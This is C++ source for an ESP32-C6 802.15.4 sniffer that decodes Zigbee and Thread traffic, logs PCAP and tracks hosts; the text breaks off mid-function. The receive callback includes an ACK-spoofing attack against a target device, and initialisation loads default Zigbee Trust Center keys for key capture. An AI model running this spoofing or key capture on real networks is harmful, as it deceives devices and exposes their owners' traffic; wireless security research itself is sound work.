/*
 * IEEE802154_Sniffer.cpp
 * ESP32-C6 802.15.4 promiscuous sniffer
 */

extern "C" {
#include "esp_ieee802154.h"
#include "esp_ieee802154_types.h"
#include "esp_timer.h"
#include "nvs_flash.h"
#include "esp_mac.h"
}

#include "IEEE802154Sniffer.h"

#include <freertos/FreeRTOS.h>
#include <freertos/queue.h>

// -- Weak symbol callbacks -----------------------------------------------------
extern "C" void esp_ieee802154_receive_done(uint8_t *frame,
                                             esp_ieee802154_frame_info_t *fi) {
    IEEE802154Sniffer::rxCallback(frame, fi);
    esp_ieee802154_receive_handle_done(frame);
}
extern "C" void esp_ieee802154_receive_failed(uint16_t error) {}
extern "C" void esp_ieee802154_receive_sfd_done(void) {}
extern "C" void esp_ieee802154_transmit_done(const uint8_t *frame,
                                              const uint8_t *ack,
                                              esp_ieee802154_frame_info_t *fi) {}
extern "C" void esp_ieee802154_transmit_failed(const uint8_t *frame,
                                                esp_ieee802154_tx_error_t err) {}

// -- Static members ------------------------------------------------------------
QueueHandle_t IEEE802154Sniffer::_rxQueue = nullptr;

volatile bool     IEEE802154Sniffer::_ackAttackActive = false;
volatile uint16_t IEEE802154Sniffer::_ackAttackTarget = 0xFFFF;
volatile uint32_t IEEE802154Sniffer::_ackAttackCount  = 0;

static const uint8_t HOP_CHANNELS[] = {11,15,20,25,26,12,16,21};
static const uint8_t HOP_COUNT = sizeof(HOP_CHANNELS);

// -- ISR callback --------------------------------------------------------------
void IEEE802154Sniffer::rxCallback(uint8_t *frame,
                                    esp_ieee802154_frame_info_t *fi) {
    if (!_rxQueue || !frame) return;
    uint8_t len = frame[0];
    if (len < 3 || len > SNIFFER_MAX_FRAME_LEN) return;

    // --- ACK-attack fast path (ZigDiggity "ack_attack") ---------------------
    // Runs in the receive-done ISR/driver context so we react before the real
    // target's radio can. If this frame is a data frame addressed (short) to
    // the attack target and it requests an ACK, inject a spoofed ACK with the
    // matching sequence number *immediately* — no sleep/receive dance (that
    // path takes milliseconds; the 802.15.4 ACK window is ~192us).
    // Caveat: even from here, whether we beat the legitimate device depends on
    // driver turnaround and RF proximity; treat wins as best-effort. Also
    // note esp_ieee802154_transmit() is being called from the receive_done
    // context, which is not a documented-safe reentrancy point - it works in
    // practice for this research tool but is the first suspect if the radio
    // wedges under sustained attack.
    if (_ackAttackActive && len >= 9) {         // FC(2)+seq(1)+dstPAN(2)+dst(2)+FCS(2)
        uint8_t fcLow  = frame[1];
        uint8_t fcHigh = frame[2];
        uint8_t ftype  = fcLow & FC_FRAME_TYPE_MASK;
        bool    ackReq = (fcLow >> 5) & 0x01;
        uint8_t dstMode = (fcHigh >> 2) & 0x03;
        if (ftype == FC_FRAME_TYPE_DATA && ackReq && dstMode == ADDR_MODE_SHORT) {
            uint16_t dst = (uint16_t)frame[6] | ((uint16_t)frame[7] << 8);
            if (dst == _ackAttackTarget) {
                // Bare ACK: len(1)=5 | FC(2)=0x0200 | seq(1) | radio adds FCS(2)
                uint8_t ackBuf[4] = { 0x05, 0x02, 0x00, frame[3] };
                esp_ieee802154_transmit(ackBuf, false);
                _ackAttackCount++;
                // Fall through: still queue the frame so it shows in the sniff log.
            }
        }
    }

    SnifferFrame sf;
    sf.len          = len - 2;  // strip FCS
    sf.rssi         = fi ? fi->rssi : 0;
    sf.lqi          = fi ? fi->lqi  : 0;
    sf.channel      = esp_ieee802154_get_channel();
    sf.timestamp_us = (uint32_t)esp_timer_get_time();
    memcpy(sf.data, &frame[1], sf.len);

    BaseType_t woken = pdFALSE;
    xQueueSendFromISR(_rxQueue, &sf, &woken);
    if (woken) portYIELD_FROM_ISR();
}

// -- Constructor ---------------------------------------------------------------
// Default channel at Home = 26
IEEE802154Sniffer::IEEE802154Sniffer()
    : _channel(SNIFFER_DEFAULT_CHANNEL)
    , _initialised(false), _running(false)
    , _hopping(false), _hopInterval(500), _lastHop(0), _hopIdx(0)
    , _frameCount(0), _zbCount(0), _threadCount(0), _dropped(0)
    , _pcapOut(nullptr), onFrame(nullptr)
{}

// -- init() - radio setup only, no RX -----------------------------------------
bool IEEE802154Sniffer::init(uint8_t channel) {
    _channel = constrain(channel, SNIFFER_MIN_CHANNEL, SNIFFER_MAX_CHANNEL);

    if (!_rxQueue) {
        _rxQueue = xQueueCreate(SNIFFER_QUEUE_DEPTH, sizeof(SnifferFrame));
        if (!_rxQueue) return false;
    }

    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }

    if (esp_ieee802154_enable() != ESP_OK) return false;

    esp_ieee802154_set_promiscuous(true);
    esp_ieee802154_set_coordinator(false);
    esp_ieee802154_set_rx_when_idle(true);
    esp_ieee802154_set_panid(0xFFFF);
    esp_ieee802154_set_short_address(0xFFFF);

    uint8_t eui64[8] = {};
    esp_read_mac(eui64, ESP_MAC_IEEE802154);
    esp_ieee802154_set_extended_address(eui64);
    esp_ieee802154_set_channel(_channel);

    // esp_read_mac() returns canonical (printed) MSB-first byte order, matching
    // how info.srcExtended/dstExtended print via %016llX elsewhere in this file.
    // On-air extended addresses are little-endian, so TX frame builders below
    // must emit byte i = (_ownEUI64 >> (8*i)) & 0xFF, mirroring how _decodeMac
    // reconstructs srcExtended/dstExtended from wire bytes.
    _ownEUI64 = 0;
    for (int i = 0; i < 8; i++) _ownEUI64 = (_ownEUI64 << 8) | eui64[i];

    // Remember the real hardware MAC so a spoofed EUI64 can be reverted exactly.
    _hwEUI64 = _ownEUI64;
    memcpy(_hwEUI64Bytes, eui64, 8);

    _initialised = true;

    // Load default Zigbee Trust Center Link Key "ZigBeeAlliance09"
    addKey(ZbKeyType::TRUST_CENTER_LINK, ZIGBEE_DEFAULT_TCLK, 0, "Default TCLK");
    // all-zeros key
    addKey(ZbKeyType::TRUST_CENTER_LINK, ZIGBEE_ZERO_KEY, 1, "Zero TCLK");
    // Found on Google:  https://github.com/Koenkk/zigbee2mqtt/discussions/13437
    addKey(ZbKeyType::TRUST_CENTER_LINK, ZIGBEE_SEQ_KEY, 2, "Seq TCLK");

    addKey(ZbKeyType::TRUST_CENTER_LINK, ZIGBEE_EISY_TCLK, 3, "eISY TCLK");

    Serial.printf("[Sniffer] Initialised ch %u\n", _channel);
    return true;
}

// -- start() - begin receiving -------------------------------------------------
bool IEEE802154Sniffer::start() {
    if (!_initialised && !init(_channel)) return false;
    if (_running) return true;
    if (esp_ieee802154_receive() != ESP_OK) return false;
    _running = true;
    Serial.printf("[Sniffer] RX started ch %u\n", _channel);
    return true;
}

// -- stop() - halt RX, radio stays configured ----------------------------------
bool IEEE802154Sniffer::stop() {
    if (!_running) return true;
    esp_ieee802154_sleep();
    _running = false;
    Serial.println("[Sniffer] RX stopped");
    return true;
}

// -- restart() -----------------------------------------------------------------
bool IEEE802154Sniffer::restart() {
    stop();
    return start();
}

// -- begin() - legacy: init + start in one call --------------------------------
bool IEEE802154Sniffer::begin(uint8_t channel) {
    return init(channel) && start();
}

// -- Channel control -----------------------------------------------------------
void IEEE802154Sniffer::setChannel(uint8_t ch) {
    _channel = constrain(ch, SNIFFER_MIN_CHANNEL, SNIFFER_MAX_CHANNEL);
    esp_ieee802154_set_channel(_channel);
    esp_ieee802154_receive();
}

void IEEE802154Sniffer::startChannelHop(uint16_t interval_ms) {
    _hopInterval = interval_ms;
    _lastHop = millis();
    _hopIdx = 0;
    _hopping = true;
}

void IEEE802154Sniffer::stopChannelHop() { _hopping = false; }

void IEEE802154Sniffer::updateChannelHop() {
    if (!_hopping) return;
    if (millis() - _lastHop < _hopInterval) return;
    _lastHop = millis();
    _hopIdx = (_hopIdx + 1) % HOP_COUNT;
    setChannel(HOP_CHANNELS[_hopIdx]);
    Serial.printf("\r[Hop] CH:%02u  frames:%lu  ", _channel, _frameCount);
}

// -- PCap ----------------------------------------------------------------------
void IEEE802154Sniffer::startPcap(Stream *out) {
    _pcapOut = out;
    PcapGlobalHeader gh = {
        PCAP_MAGIC, PCAP_VERSION_MAJOR, PCAP_VERSION_MINOR,
        0, 0, SNIFFER_MAX_FRAME_LEN, PCAP_LINKTYPE_802154
    };
    _pcapOut->write((uint8_t*)&gh, sizeof(gh));
    Serial.println("[Sniffer] PCap started");
}


void IEEE802154Sniffer::stopPcap() {
    _pcapOut = nullptr;
    Serial.println("[Sniffer] PCap stopped");
}

void IEEE802154Sniffer::_writePcap(const SnifferFrame &raw) {
    if (!_pcapOut) return;
    uint32_t ts_sec  = raw.timestamp_us / 1000000UL;
    uint32_t ts_usec = raw.timestamp_us % 1000000UL;
    PcapPacketHeader ph = { ts_sec, ts_usec, raw.len, raw.len };
    _pcapOut->write((uint8_t*)&ph, sizeof(ph));
    _pcapOut->write(raw.data, raw.len);
}

// -- update() ------------------------------------------------------------------
uint8_t IEEE802154Sniffer::update() {
    if (!_running) return 0;
    updateChannelHop();

    uint8_t processed = 0;
    SnifferFrame raw;
    while (xQueueReceive(_rxQueue, &raw, 0) == pdTRUE) {
        _frameCount++;
        _writePcap(raw);

        FrameInfo info = {};
        if (_decodeMac(raw, info)) {
            if (info.protocol == FrameProtocol::ZIGBEE) _zbCount++;
            if (info.protocol == FrameProtocol::THREAD ||
                info.protocol == FrameProtocol::MATTER)  _threadCount++;

            // Key capture — check every frame, before display filters
            if (onKeyCapture) onKeyCapture(info, raw.data, raw.len, info.macPayloadOffset);

            if (_updateHost(info) && no_duplicates) {
              continue;
            }

            // if (no_bcast && info.bcastType != BcastType::NOT_BCAST && info.macSrc == 0xFFFF) 
            if (no_bcast && info.bcastType != BcastType::NOT_BCAST && is_bcast(info.macSrc)) {
              continue;
            }

            _printFrame(info);

            if (onFrame) onFrame(info);
        }
        processed++;
    }
    return processed;
}

// -- MAC decoder ---------------------------------------------------------------
bool IEEE802154Sniffer::_decodeMac(const SnifferFrame &raw, FrameInfo &info) {
    const uint8_t *p   = raw.data;
    const uint8_t  len = raw.len;
    if (len < 3) return false;

    info.rssi         = raw.rssi;
    info.lqi          = raw.lqi;
    info.channel      = raw.channel;
    info.timestamp_us = raw.timestamp_us;
    info.len          = len;
    info.protocol     = FrameProtocol::RAW_802154;
    info.hasRoute     = false;
    info.bcastType    = BcastType::NOT_BCAST;

    uint16_t fc      = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
    info.frameType   = fc & FC_FRAME_TYPE_MASK;
    info.srcAddrMode = (fc >> 14) & 0x03;
    info.dstAddrMode = (fc >> 10) & 0x03;
    bool panComp     = (fc >> 6) & 0x01;
    info.seqNum      = p[2];
    info.panId       = 0xFFFF;
    info.macSrc      = 0xFFFF;
    info.macDst      = 0xFFFF;

    // -- MAC frame control flags -----------------------------------------------
    info.macSecurityEnabled = (fc >> 3) & 0x01;
    info.macFramePending    = (fc >> 4) & 0x01;
    info.macAckRequest      = (fc >> 5) & 0x01;
    info.macPanIdCompressed = panComp;
    info.macIsRetry         = (fc >> 8) & 0x01;  // bit8 = frame retry

    // Zigbee NWK fields - zero out
    info.zbNwkProtoVersion    = 0;
    info.zbNwkSecurityEnabled = false;
    info.zbIsMulticast        = false;
    info.zbMulticastGroup     = 0;
    info.zbNwkRadius          = 0;
    info.beaconAssocPermit    = false;
    info.beaconStackProfile   = 0;
    info.threadRloc16         = 0;
    info.threadMleType        = 0;

    uint8_t off = 3;

    // Destination PAN + address
    if (info.dstAddrMode == ADDR_MODE_SHORT && off + 4 <= len) {
        info.panId  = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
        info.macDst = (uint16_t)p[off+2] | ((uint16_t)p[off+3] << 8);
        off += 4;
    } else if (info.dstAddrMode == ADDR_MODE_EXTENDED && off + 10 <= len) {
        info.panId = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
        off += 2;
        info.dstExtended = 0;
        for (int i = 0; i < 8; i++) info.dstExtended |= ((uint64_t)p[off+i] << (8*i));
        info.macDst = 0xFFFE;
        off += 8;
    }

    // Source address
    if (info.srcAddrMode == ADDR_MODE_SHORT) {
        if (!panComp && off + 2 <= len) off += 2;  // skip src PAN
        if (off + 2 <= len) {
            info.macSrc = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
            off += 2;
        }
    } else if (info.srcAddrMode == ADDR_MODE_EXTENDED) {
        if (!panComp && off + 2 <= len) off += 2;
        if (off + 8 <= len) {
            info.srcExtended = 0;
            for (int i = 0; i < 8; i++) info.srcExtended |= ((uint64_t)p[off+i] << (8*i));
            info.macSrc = 0xFFFE;
            off += 8;
        }
    }

    // -- Broadcast type --------------------------------------------------------
    switch (info.macDst) {
        case 0xFFFF: info.bcastType = BcastType::ALL;       break;
        case 0xFFFC: info.bcastType = BcastType::ROUTERS;   break;
        case 0xFFFB: info.bcastType = BcastType::LP_ROUTERS;break;
        case 0xFFFD: info.bcastType = BcastType::SLEEPY_ED; break;
        default:     info.bcastType = BcastType::NOT_BCAST; break;
    }

    // Record MAC payload start for ZbKeyCapture
    info.macPayloadOffset = off;

    // Payload decode
    if (off < len && info.frameType == FC_FRAME_TYPE_DATA) {
        const uint8_t *payload = &p[off];
        uint8_t payLen = len - off;

        if (_isThread(payload, payLen)) {
            info.protocol     = FrameProtocol::THREAD;
            info.protocolName = "Thread";
            _decodeThreadMesh(payload, payLen, info);
        } else if (payLen >= 8) {
            uint8_t nwkFcLow = payload[0] & 0x03;
            if (nwkFcLow == ZB_NWK_TYPE_DATA || nwkFcLow == ZB_NWK_TYPE_CMD) {
                info.protocol     = FrameProtocol::ZIGBEE;
                info.protocolName = "Zigbee";
                _decodeZigbeeNwk(payload, payLen, info);
            }
        }
    } else if (info.frameType == FC_FRAME_TYPE_BEACON && off + 4 <= len) {
        // Superframe spec (2 bytes) + GTS fields (1 byte) + pending addr (1 byte)
        // then optional beacon payload
        uint16_t superframe = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
        info.beaconCoordinator  = (superframe >> 14) & 0x01;
        info.beaconAssocPermit  = (superframe >> 15) & 0x01;
        off += 2;
        uint8_t gts = p[off++];   // GTS spec byte
        uint8_t pad = p[off++];   // pending address spec

        // Zigbee beacon payload: starts after MAC header
        // Format: protocol ID (0x00) | stack profile (4 bits) | proto ver (4 bits)
        //         | router cap (1) | device depth (4) | end dev cap (1) | extended PAN (8 bytes)
        if (off + 3 <= len && p[off] == 0x00) {
            off++;  // skip protocol ID byte
            uint8_t sp = p[off++];
            info.beaconStackProfile    = sp & 0x0F;
            info.beaconProtocolVersion = (sp >> 4) & 0x0F;
            uint8_t cap = p[off++];
            info.beaconRouterCapacity  = (cap >> 2) & 0x01;
            info.beaconEndDevCapacity  = (cap >> 7) & 0x01;
        }
        info.protocolName = "Beacon";
        info.functionName = info.beaconAssocPermit ? "Open" : "Closed";
    } else if (info.frameType == FC_FRAME_TYPE_ACK) {
        info.protocolName = "ACK";
        info.functionName = "";

    } else if (info.frameType == FC_FRAME_TYPE_MAC_CMD) {
        info.protocolName = "MAC Cmd";
        // Decode command ID from payload
        if (off < len) {
            switch (p[off]) {
                case 0x01: info.functionName = "Assoc Request";  break;
                case 0x02: info.functionName = "Assoc Response"; break;
                case 0x03: info.functionName = "Disassoc";       break;
                case 0x04: info.functionName = "Data Request";   break;
                case 0x05: info.functionName = "PAN ID Conflict Notification";   break;
                case 0x06: info.functionName = "Orphan Notification";   break;
                case 0x07: info.functionName = "Beacon Request"; break;
                case 0x08: info.functionName = "Coordinator Realignment"; break;
                case 0x09: info.functionName = "GTS Request"; break;
                case 0x0A: info.functionName = "TRLE Management Request"; break;
                case 0x0B: info.functionName = "TRLE Management Response"; break;
                case 0x13: info.functionName = "DSME Association Request"; break;
                default:   info.functionName = "MAC Cmd";        break;
            }
        }
    }




    if (!info.protocolName) {
        info.protocolName = "802.15.4";
        info.functionName = _frameTypeName(info.frameType);
    }

    // Populate route MAC hops
    info.route.macSrc = info.macSrc;
    info.route.macDst = info.macDst;

    return true;
}

// -- Zigbee NWK decoder with full route ---------------------------------------
bool IEEE802154Sniffer::_decodeZigbeeNwk(const uint8_t *p, uint8_t len,
                                           FrameInfo &info) {
    if (len < 8) return false;

    uint16_t nwkFc    = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
    info.zbNwkType    = nwkFc & 0x03;
    info.route.nwkDst = (uint16_t)p[2] | ((uint16_t)p[3] << 8);
    info.route.nwkSrc = (uint16_t)p[4] | ((uint16_t)p[5] << 8);
    info.route.radius = p[6];
    uint8_t nwkSeq    = p[7];

    // Extra NWK fields from frame control
    info.zbNwkProtoVersion    = (nwkFc >> 2) & 0x0F;   // bits[5:2]
    // bit9 = NWK layer security (spec 3.3.1.1 / matches Wireshark zbee_nwk).
    // Previously read from bit1, which lives inside the 2-bit frame-type field
    // (bits0-1) and is therefore always 0 for Data/Command frames - this made
    // zbNwkSecurityEnabled permanently false for essentially all real traffic.
    info.zbNwkSecurityEnabled = (nwkFc & ZB_NWK_FC_SECURITY) != 0;
    info.zbIsMulticast        = (nwkFc >> 8) & 0x01;   // bit8 - multicast flag
    info.zbNwkRadius          = p[6];

    // Multicast control field - immediately after fixed NWK header if multicast
    uint8_t off = 8;
    info.zbMulticastGroup = 0;
    if (info.zbIsMulticast && off + 1 <= len) {
        // Multicast control byte, then group address at nwkDst
        info.zbMulticastGroup = info.route.nwkDst;
        off++;  // skip multicast control byte
    }

    // Optional extended destination address
    if ((nwkFc & ZB_NWK_FC_EXT_DST) && off + 8 <= len) {
      uint64_t extDst = 0;
      memcpy(&extDst, &p[off], 8);
      if (info.dstExtended == 0) info.dstExtended = extDst;
      off += 8;
    }

    // Optional extended source address
    if ((nwkFc & ZB_NWK_FC_EXT_SRC) && off + 8 <= len) {
        // Could capture NWK extended src here
        uint64_t extSrc = 0;
        memcpy(&extSrc, &p[off], 8);
        if (info.srcExtended == 0) info.srcExtended = extSrc;
        off += 8;
    }

    // Source route subframe - gives us the full relay list
    info.route.hasSourceRoute = (nwkFc & ZB_NWK_FC_SOURCE_ROUTE) != 0;
    info.route.hopCount = 0;

    if (info.route.hasSourceRoute && off + 2 <= len) {
        uint8_t relayCount = p[off];
        uint8_t relayIndex = p[off + 1];
        off += 2;
        // relayCount entries of 2 bytes each - relay list in order
        uint8_t n = min((uint8_t)relayCount, (uint8_t)SNIFFER_MAX_ROUTE_HOPS);
        for (uint8_t i = 0; i < n && off + 2 <= len; i++, off += 2) {
            info.route.relays[i] = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
        }
        info.route.hopCount = n;
    }

    info.hasRoute = true;

    // Function name
    if (info.zbNwkType == ZB_NWK_TYPE_CMD && off < len) {
        info.zbNwkCmd     = p[off];
        info.functionName = _zbNwkCmdName(info.zbNwkCmd);
    } else {
        info.functionName = (info.zbNwkType == ZB_NWK_TYPE_DATA) ? "Data" : "NWK";
    }

    return true;
}

// -- Thread mesh header decoder ------------------------------------------------
bool IEEE802154Sniffer::_decodeThreadMesh(const uint8_t *p, uint8_t len,
                                           FrameInfo &info) {
    if (len < 1) return false;

    uint8_t dispatch = p[0];
    uint8_t off = 0;

    // 6LoWPAN mesh header: dispatch 0b10xxxxxx = 0x80
    if ((dispatch & 0xC0) == 0x80 && len >= 5) {
        bool v  = (dispatch >> 5) & 1;  // 0=16-bit, 1=64-bit originator
        bool f  = (dispatch >> 4) & 1;  // 0=16-bit, 1=64-bit final
        off = 1;

        if (!v && off + 2 <= len) {
            info.route.nwkSrc = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
            off += 2;
        } else if (v && off + 8 <= len) {
            // 64-bit - just take lower 16 as identifier
            info.route.nwkSrc = (uint16_t)p[off+6] | ((uint16_t)p[off+7] << 8);
            off += 8;
        }

        if (!f && off + 2 <= len) {
            info.route.nwkDst = (uint16_t)p[off] | ((uint16_t)p[off+1] << 8);
            off += 2;
        } else if (f && off + 8 <= len) {
            info.route.nwkDst = (uint16_t)p[off+6] | ((uint16_t)p[off+7] << 8);
            off += 8;
        }

        info.route.macSrc = info.macSrc;
        info.route.macDst = info.macDst;
        info.route.hopCount = 0;
        info.route.hasSourceRoute = false;
        info.hasRoute = true;
        info.functionName = "Mesh";
    } else {
        // Plain IPHC without mesh header
        info.route.nwkSrc = info.macSrc;
        info.route.nwkDst = info.macDst;
        info.hasRoute = false;
        info.functionName = "6LoWPAN";
    }
    return true;
}

bool IEEE802154Sniffer::_isThread(const uint8_t *p, uint8_t len) {
    if (len < 1) return false;
    return ((p[0] & 0xE0) == 0x60) ||   // IPHC
           ((p[0] & 0xC0) == 0x80);      // Mesh header
}

// -- Host tracking -------------------------------------------------------------
HostRecord *IEEE802154Sniffer::findHost(uint16_t addr) {
    for (int i = 0; i < hosts.size(); i++) {
        if (hosts.get(i)->shortAddr == addr) return hosts.get(i);
    }
    return nullptr;
}

bool IEEE802154Sniffer::labelHost(uint16_t addr, char type, const char *label) {
    HostRecord *h = findHost(addr);
    if (!h) {
        h = new HostRecord();
        h->shortAddr    = addr;
        h->panId        = 0;
        h->extAddr      = 0;
        h->rssiMin = h->rssiMax = h->rssiLast = 0;
        h->lqiLast = h->channel = 0;
        h->firstSeen_ms = h->lastSeen_ms = 0;
        h->frameCount = h->txCount = h->rxCount = 0;
        h->retryCount = h->secureCount = h->acksMissed = 0;
        h->seqGaps = h->nwkProtoVersion = 0;
        h->beaconSeen = h->associationPermit = false;
        h->routerCapacity = h->endDevCapacity = false;
        h->lastMacSeq = h->lastNwkSeq = 0;
        h->lastPollTime_ms = h->avgPollInterval_ms = 0;
        h->deviceType   = DeviceType::UNKNOWN;
        h->protocol     = FrameProtocol::RAW_802154;
        memset(h->label, 0, sizeof(h->label));
        hosts.add(h);
    }
    // Set device type from char
    switch (type) {
        case 'C': case 'c': h->deviceType = DeviceType::COORDINATOR; break;
        case 'R': case 'r': h->deviceType = DeviceType::ROUTER;      break;
        case 'E': case 'e': h->deviceType = DeviceType::END_DEVICE;  break;
        default:            h->deviceType = DeviceType::UNKNOWN;      break;
    }
    strncpy(h->label, label, SNIFFER_MAX_LABEL_LEN - 1);
    h->label[SNIFFER_MAX_LABEL_LEN - 1] = '\0';
    return true;
}

void IEEE802154Sniffer::loadLabels(const char *csv) {
    // Format: "addr,type,label\n" - addr is hex without 0x prefix
    // e.g. "16CC,E,On-Off W Button\n1A2E,R,Color Bulb 1\n"
    if (!csv) return;
    char buf[64];
    const char *p = csv;
    while (*p) {
        // Find end of line
        const char *eol = strchr(p, '\n');
        size_t lineLen = eol ? (size_t)(eol - p) : strlen(p);
        if (lineLen == 0) { p = eol ? eol + 1 : p + strlen(p); continue; }
        if (lineLen >= sizeof(buf)) { p = eol ? eol + 1 : p + strlen(p); continue; }

        memcpy(buf, p, lineLen);
        buf[lineLen] = '\0';

        // Parse addr,type,label
        char *tok = strtok(buf, ",");
        if (!tok) { p = eol ? eol + 1 : p + strlen(p); continue; }
        uint16_t addr = (uint16_t)strtol(tok, nullptr, 16);

        tok = strtok(nullptr, ",");
        if (!tok) { p = eol ? eol + 1 : p + strlen(p); continue; }
        char type = tok[0];

        tok = strtok(nullptr, "\n");
        const char *label = tok ? tok : "";

        labelHost(addr, type, label);
        p = eol ? eol + 1 : p + strlen(p);
    }
    Serial.printf("[Sniffer] Loaded %d host labels\n", hosts.size());
}

const char *IEEE802154Sniffer::addrLabel(uint16_t addr, char *buf, uint8_t bufLen) {
    if (addr == 0xFFFF) { strncpy(buf, "BCAST", bufLen); return buf; }
    if (addr == 0xFFFC) { strncpy(buf, "ROUTERS", bufLen); return buf; }
    if (addr == 0xFFFB) { strncpy(buf, "LP_RTR", bufLen); return buf; }
    if (addr == 0xFFFD) { strncpy(buf, "SLEEPY", bufLen); return buf; }
    HostRecord *h = findHost(addr);
    if (h && h->label[0] != '\0') {
        strncpy(buf, h->label, bufLen - 1);
        buf[bufLen - 1] = '\0';
        return buf;
    }
    snprintf(buf, bufLen, "0x%04X", addr);
    return buf;
}

bool IEEE802154Sniffer::_updateHost(const FrameInfo &info) {
    uint32_t now = millis();

    // Serial.printf("DEBUG _updateHost macSrc=0x%04X macDst=0x%04X\n", info.macSrc, info.macDst);

    bool ret_val = true;

    auto updateRecord = [&](uint16_t addr, bool isSrc) {
        if (is_bcast(addr))
          return;
       //  if (addr == 0xFFFF || addr == 0xFFFE || addr == 0xFFFB ||
       //      addr == 0xFFFC || addr == 0xFFFD) return;  // skip all broadcast addrs

        HostRecord *h = findHost(addr);
        if (!h) {
            ret_val = false;
            h = new HostRecord();
            h->shortAddr    = addr;
            h->panId        = info.panId;
            h->extAddr      = 0;
            h->rssiMin      = info.rssi;
            h->rssiMax      = info.rssi;
            h->rssiLast     = info.rssi;
            h->lqiLast      = info.lqi;
            h->channel      = info.channel;
            h->firstSeen_ms = now;
            h->lastSeen_ms  = now;
            h->frameCount   = 0;
            h->txCount      = 0;
            h->rxCount      = 0;
            h->retryCount   = 0;
            h->secureCount  = 0;
            h->acksMissed   = 0;
            h->seqGaps      = 0;
            h->nwkProtoVersion = 0;
            h->beaconSeen   = false;
            h->associationPermit = false;
            h->routerCapacity = false;
            h->endDevCapacity = false;
            h->lastMacSeq   = info.seqNum;
            h->lastNwkSeq   = 0;
            h->lastPollTime_ms = 0;
            h->avgPollInterval_ms = 0;
            h->deviceType   = (addr == 0x0000) ? DeviceType::COORDINATOR
                                                : DeviceType::UNKNOWN;
            h->protocol     = info.protocol;
            memset(h->label, 0, sizeof(h->label));
            hosts.add(h);
        }
        // After the host lookup/create block, add:
        if (addr == info.macSrc && info.srcExtended != 0 && h->extAddr == 0)
            h->extAddr = info.srcExtended;
        if (addr == info.macDst && info.dstExtended != 0 && h->extAddr == 0)
            h->extAddr = info.dstExtended;


        // RSSI / LQI
        h->rssiLast    = info.rssi;
        h->lqiLast     = info.lqi;
        h->channel     = info.channel;
        h->lastSeen_ms = now;
        h->frameCount++;
        if (info.rssi < h->rssiMin) h->rssiMin = info.rssi;
        if (info.rssi > h->rssiMax) h->rssiMax = info.rssi;
        if (isSrc) h->txCount++;
        else       h->rxCount++;

        // if (isSrc) h->connected_hosts.add(info.macDst);
        // if (isSrc) h->connected_hosts.add(new uint16_t(info.macDst));
        if (isSrc && !is_bcast(info.macDst) && info.macDst)  {
          bool jj = true;
          for (int j = 0; j < h->connected_hosts.size(); j++) {
            if (h->connected_hosts.get(j) == info.macDst) {
              jj = false;
              break;
            }
          }
          if (jj) 
            h->connected_hosts.add(info.macDst);
        }

        // Retry / security counts
        if (info.macIsRetry)          h->retryCount++;
        if (info.macSecurityEnabled)  h->secureCount++;

        // Sequence gap detection (source frames only)
        if (isSrc) {
            uint8_t expected = h->lastMacSeq + 1;
            if (h->frameCount > 1 && info.seqNum != expected && !info.macIsRetry)
                h->seqGaps++;
            h->lastMacSeq = info.seqNum;
        }

        // Zigbee NWK info
        if (info.protocol == FrameProtocol::ZIGBEE) {
            if (info.zbNwkProtoVersion > h->nwkProtoVersion)
                h->nwkProtoVersion = info.zbNwkProtoVersion;
        }

        // Beacon info
        if (info.frameType == FC_FRAME_TYPE_BEACON && isSrc) {
            h->beaconSeen        = true;
            h->associationPermit = info.beaconAssocPermit;
            h->routerCapacity    = info.beaconRouterCapacity;
            h->endDevCapacity    = info.beaconEndDevCapacity;
            // Beacon senders are coordinators or routers
            if (h->deviceType == DeviceType::UNKNOWN)
                h->deviceType = DeviceType::ROUTER;
        }

        // Poll interval inference - MAC Cmd frames from sleepy end devices
        // (frame pending + data request pattern)
        if (info.frameType == FC_FRAME_TYPE_MAC_CMD && isSrc &&
            !info.macFramePending) {
            if (h->lastPollTime_ms > 0) {
                uint32_t interval = now - h->lastPollTime_ms;
                // Rolling average (simple EMA with alpha=0.25)
                if (h->avgPollInterval_ms == 0)
                    h->avgPollInterval_ms = interval;
                else
                    h->avgPollInterval_ms = (h->avgPollInterval_ms * 3 + interval) / 4;
                h->deviceType = DeviceType::END_DEVICE;
            }
            h->lastPollTime_ms = now;
        }
    };

    updateRecord(info.macSrc, true);
    updateRecord(info.macDst, false);

    if (info.hasRoute) {
        updateRecord(info.route.nwkSrc, true);
        updateRecord(info.route.nwkDst, false);

        // Mark any relay as ROUTER
        for (uint8_t i = 0; i < info.route.hopCount; i++) {
            uint16_t relay = info.route.relays[i];
            HostRecord *r = findHost(relay);
            if (!r) {
                r = new HostRecord();
                r->shortAddr    = relay;
                r->extAddr      = 0;
                r->panId        = info.panId;
                r->rssiMin = r->rssiMax = r->rssiLast = 0;
                r->firstSeen_ms = r->lastSeen_ms = now;
                r->frameCount = r->txCount = r->rxCount = 0;
                r->protocol   = info.protocol;
                hosts.add(r);
            }
            r->deviceType = DeviceType::ROUTER;
        }
    }
    return ret_val;
}

void IEEE802154Sniffer::printHosts() {
    Serial.println("\n-- Host List -------------------------------------------------------------");
    Serial.println("  Ch Addr   Label                Type        Frames  TX    RX   RSSI(l/n/x) LQI");
    Serial.println("  -----------------------------------------------------------------------");
    for (int i = 0; i < hosts.size(); i++) {
        HostRecord *h = hosts.get(i);
        if (!h->frameCount) 
          continue;
        const char *dtype = "Unknown";
        if (h->deviceType == DeviceType::COORDINATOR) dtype = "Coordinator";
        else if (h->deviceType == DeviceType::ROUTER)  dtype = "Router";
        else if (h->deviceType == DeviceType::END_DEVICE) dtype = "End Device";
        const char *proto = "802.15.4";
        if (h->protocol == FrameProtocol::ZIGBEE) proto = "Zigbee";
        else if (h->protocol == FrameProtocol::THREAD) proto = "Thread";
        Serial.printf("  %u 0x%04X %-20s %-12s %6lu %5lu %5lu %4d/%4d/%4d %3u %d",
            h->channel,
            h->shortAddr,
            h->label[0] ? h->label : "",
            dtype,
            h->frameCount, h->txCount, h->rxCount,
            h->rssiLast, h->rssiMin, h->rssiMax, h->lqiLast,
            h->connected_hosts.size());
